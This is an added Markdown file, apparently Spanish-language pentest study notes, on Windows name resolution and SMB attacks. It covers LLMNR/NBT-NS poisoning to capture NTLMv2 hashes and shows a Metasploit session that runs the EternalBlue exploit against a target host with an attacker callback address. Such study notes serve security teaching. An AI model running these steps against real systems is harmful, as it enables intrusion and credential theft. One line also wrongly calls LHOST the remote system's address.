@@ -1,0 +1,66 @@
+# Resolución de nombres de Windows y ataques de SMB
+La resolución de nombres es uno de los aspectos más fundamentales de las redes, los sistemas operativos y las aplicaciones. Existen varias tecnologías y protocolos de serolución de nombre a dirección IP, incluido el sistema de entrada/salida básico de red (NetBIOS), la resolución de nombres de multidifusión local de enlace (LLMNR) y el sistema de nombres de dominio (DNS). Las secciones que siguen cubren las vulnerabilidades y explotaciones relacionados con estos protocolos.
+
+## Servicio de nombres NetBIOS y LLMNR
+NetBIOS y LLMNR son protocolos utilizados principalmente por Microsoft Windows para la identificación de hosts. LLMNR, que se basa en el formato del protocolo DNS, permite que los hosts en el mismo enlace local realicen la resolución de nombres para otros hosts. Por ejemplo, un host de Windows que intenta comunicarse con una impresora o con una carpeta compartida de la red puede usar NetBIOS.<br>
+
+<img src="Imagenes/netBIOS.jpeg" width="35%" height="35%" style="border-radius:10px;"><br>
+NetBIOS ofrece tres servicios diferentes:
+- Servicio de nombres NetBIOS (NetBIOS-NS) para el registro y la resolución de nombres
+- Servicio de datagramas (NetBIOS-DGM) para comunicación sin conexión
+- Servicio de sesión (NetBIOS-SSN) para la comunicación orientada a la conexión
+
+Las operaciones relacionadas con NetBIOS utilizan los siguientes puertos y protocolos:
+- __Puerto TCP 135__: Asignador de terminales de Llamada a procedimiento remoto de Microsoft (MS-RPC), utilizado para la comunicación de cliente a cliente y de servidor a cliente
+- __Puerto UDP 137__: Servicio de nombres NetBIOS
+- __Puerto UDP 138__: Servicio de datagrama NetBIOS
+- __Puerto TCP 139__:Servicio de sesión NetBIOS
+- __Puerto TCP 445__: Protocolo SMB, utilizado para compartir archivos entre diferentes sistemas operativos, incluidos los sistemas basados en Windows y en Unix
+
+En Windows, un grupo de trabajo es una red de área local (LAN) de igual a igual que puede admitir un máximo de 10 hosts en la misma subred. Un grupo de trabajo no tiene una administración centralizada. Básicamente, cada usuario controla los recursos y la seguridad localmente en su sistema. Una implementación basada en dominios, por otro lado, es una red de cliente a servidor que puede admitir miles de hosts que están geográficamente dispersos en muchas subredes. Un usuario con una cuenta en el dominio puede iniciar sesión en cualquier sistema informático sin tener una cuenta en ese equipo. Lo hace mediante la autenticación en un controlador de dominio.
+
+Históricamente, ha habido docenas de vulnerabilidades en NetBIOS, SMB y LLMNR. Veamos un ejemplo sencillo. El nombre del grupo de trabajo predeterminado en Windows es WORKGROUP. Muchos usuarios dejan su grupo de trabajo configurado con este nombre predeterminado y configuran el uso compartido de archivos o impresoras con credenciales débiles. Es muy fácil para un atacante enumerar las máquinas y potencialmente comprometer el sistema forzando contraseñas o aprovechando otras técnicas.
+
+Una vulnerabilidad común en LLMNR implica que un atacante falsifique una fuente autorizada para la resolución de nombres en un sistema víctima respondiendo al tráfico LLMNR a través del puerto UDP 5355 y al tráfico NBT-NS a través del puerto UDP 137. El atacante básicamente envenena el servicio LLMNR para manipular el sistema de la víctima. Si el host solicitado pertenece a un recurso que requiere identificación o autenticación, el nombre de usuario y el hash de NTLMv2 se envían al atacante. El atacante puede recopilar el hash enviado a través de la red mediante el uso de herramientas como rastreadores. Posteriormente, el atacante puede usar la fuerza bruta o descifrar los hashes sin conexión para obtener las contraseñas de texto sin formato.
+
+Se pueden utilizar varias herramientas para realizar este tipo de ataque, como _NBNSpoof_, _Metasploit_ y _Responder_. Metasploit, por supuesto, es una de las herramientas y marcos más populares utilizados por los evaluadores de penetración y los atacantes. Otra herramienta de código abierto que es muy popular e incluso ha sido utilizada por malware es _Pupy_, que está disponible en GitHub. Pupy es una herramienta de administración remota multiplataforma y posterior a la explotación basada en Python que funciona en Windows, Linux, macOS e incluso en Android.
+
+## Explotaciones para SMB
+Históricamente SMB ha sufrido numerosas vulnerabilidades catastróficas. Puede ver esto fácilmente explorando las docenas de explotaciones conocidos en la base de datos de explotaciones mediante en comando _searchsploit_.
+```bash
+kali@kali:~$ searchsploit smb
+```
+Una de las explotaciones de SMB más utilizados en los últimos tiempos ha sido la explotación _EternalBlue_, filtrado por una entidad llamada Shadow Brokers que supuestamente robó numerosas explotaciones de la Agencia de Seguridad Nacional (NSA) de EE.UU. La expolotación exitosa de EternalBlue permite que un atacante remoto no autenticado comprometa un sistema afectado y ejecute código arbitrario. Esta explotación se ha utilizado en ransomware como _WannaCry_ y _Nyeta_. Esta explotación se ha adaptado a muchas herramientas diferentes, incluido _Metasploit_.<br>
+_Uso de la explotación **EternalBlue** en Metasploit_<br>
+```
+  msf> use exploit/windows/smb/ms17_010_eternalblue
+msf> exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-
+                                             framework/wiki/Using-Metasploit
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only 
+                                             affects Windows Server 2008 R2, Windows 7, Windows Embedded 
+                                             Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+                                             Only affects Windows Server 2008 R2, Windows 7, Windows Embedded 
+                                             Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows 
+                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target 
+                                             machines.
+<output omitted for brevity>
+msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.1.1.2
+msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.66.6
+msf exploit(ms17_010_eternalblue) > exploit
+```
+Se invoca el comando *use exploit/windows/smb/ms17_010_eternalblue* para usar la explotación EternalBlue. Luego el comando _show options_ se usa para mostrar todas las opciones configurables para la explotación EternalBlue. Como mínimo, se deben configurar la dirección IP del host remoto (RHOST) y la dirección IP del host con el que desea que la víctima se comunique despúes de la explotación (LHOST). Para configurar RHOST, utilice el comando _set RHOST_ seguido de la dirección IP del sistema remoto. Para configurar LHOST, utilice el comando _set LHOST_ seguido de la dirección Ip del sistema remoto. El puerto remoto (445) ya está configurado de manera prdeterminada. Después de ejecutar el comando _exploit_, Metasploit ejecuta la explotación contra el sistema de destino e inicia una sesión de Meterpreter para permitirle controlar y comprometer aún más el sistema. Meterpreter es una herramienta posterior a la explotación; es parte del marco de Metasploit.
+Puede usar herramientas como _Nmap_ y _Enum4linux_ para recopilar información sobre sistemas SMB vulnerables y luego usar herramientas como Metasploit para aprovechar las vulnerabilidades conocidas.
+
+
+
